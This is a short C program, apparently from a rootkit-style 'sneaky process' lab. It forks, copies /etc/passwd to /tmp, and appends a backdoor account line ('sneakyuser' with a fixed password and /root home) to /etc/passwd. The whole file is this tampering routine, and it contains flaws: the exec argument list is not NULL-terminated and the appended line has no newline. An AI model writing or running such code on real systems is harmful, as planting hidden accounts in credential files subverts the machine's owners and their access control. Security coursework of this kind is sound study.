#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "sneaky_mod.c"

int main() {
  int rc = fork();  
  printf("sneaky_process pid=%d\n", getpid());
  if (rc < 0) {
    fprintf(stderr, "fork failed\n");
    exit(1);
  } else if (rc == 0) {
    char * myargs[3];
    myargs[0] = strdup("cp");
    myargs[1] = strdup("/etc/passwd");
    myargs[2] = strdup("/tmp/passwd");
    execvp(myargs[0], myargs);
  } else {    
    FILE * target = fopen("/etc/passwd", "a");
    char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fprintf(target, "%s", append); 
    fclose(target);
  }
  return 0;
}


